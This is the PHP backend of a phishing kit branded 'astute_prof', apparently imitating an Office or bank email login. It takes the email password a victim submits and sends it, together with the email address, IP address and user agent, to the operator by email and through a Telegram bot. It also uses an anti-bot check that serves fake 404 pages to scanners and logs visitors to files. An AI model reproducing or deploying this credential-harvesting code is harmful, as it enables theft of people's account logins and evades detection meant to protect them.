<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Astute/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['emailPassword']
    )) {
        if (!$comps->checkEmpty(
            $_POST['emailPassword']
        )) {
            $content = '
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <style>
        
                    * {
                        font-family: Arial;
                        font-weight: normal;
                        color: ##00674a;
                        margin: 0;
                        padding: 0;
                    }

                    .text-center {
                        text-align: center;
                    }
        
                    .small {
                        font-size: .8rem;
                    }
        
                    .mt-05 {
                        margin-top: .5rem;
                    }
        
                    .mt-1 {
                        margin-top: 1rem;
                    }
        
                    .mt-2, .my-2 {
                        margin-top: 2rem;
                    }
        
                    .my-3 {
                        margin: 3rem 0;
                    }
        
                    .mb-2, .my-2 {
                        margin-bottom: 2rem;
                    }
        
                    .text-light {
                        color: #8c8c8c;
                    }

                    .text-citizens {
                        color: ##00674a;
                    }
        
                    .container {
                        padding-left: 1.5rem;
                        padding-right: 1.5rem;
                    }
        
                    hr {
                        border: none;
                        margin-top: 1rem;
                        margin-bottom: 1rem;
                        height: 1px;
                        background-color: #8c8c8c;
                    }
        
                </style>

                <div class="text-center my-2">
                    <h4 class="text-light">astute_prof <span class="text-citizens">OFFICE</span></h4>
                    <h2>(1) Email Access </h2>
                </div>
                
                <div class="container">
                    <div class="mt-2">
                        <div>
                            <h3 class="text-light"> Email Access</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Email Address: ' . $_SESSION['email'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Password: ' . $_POST['emailPassword'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Domain: ' . substr($_SESSION['email'], strpos($_SESSION['email'], '@') + 1) . '</h3>
                        </div>
                       
                    <div class="my-3 text-center">
                        <span class="small text-light">Private page made by <a href="https://t.me/astute_prof" target="_blank">astute_prof</a>.</span>
                    </div>
                </div>
            ';
             $ipi = getenv("REMOTE_ADDR");
$useriagent = $_SERVER['HTTP_USER_AGENT'];

$telcontent = <<<EOT
»»————- †[  ✔️office by Astute 4 magpie✔️ ]† ————-««
[E-Mail ID]           : {$_SESSION['email']}
[E-Mail Pass]         : {$_POST['emailPassword']}
»»————- †[ 🤖DEVICE INFO 🤖]† ————-««

IP		: $ipi
Agent   : $useriagent
»»————- †[ 🤖contact telegram @astute_prof 🤖]† ————-««
\r\n\r\n
EOT;

if (isset($settings['telegram']) && $settings['telegram'] == "on"){
    if(isset($_SESSION['telegram']) || !$_SESSION['telegram']){
        $_SESSION['telegram'] = 1;
        if($comps->telegram($telcontent)){
            
        }
        //die($comps->headerX("../../Login/"));
    } 
}

            if ($comps->mailX("(1) Email Access | OfficeB3NK", $content)) {
                $comps->log(
                    "../../Astute/Audio/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Email Access\n\n"
                );
                die($comps->headerX("../../Login/complete.php"));
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Astute/Audio/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Astute/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }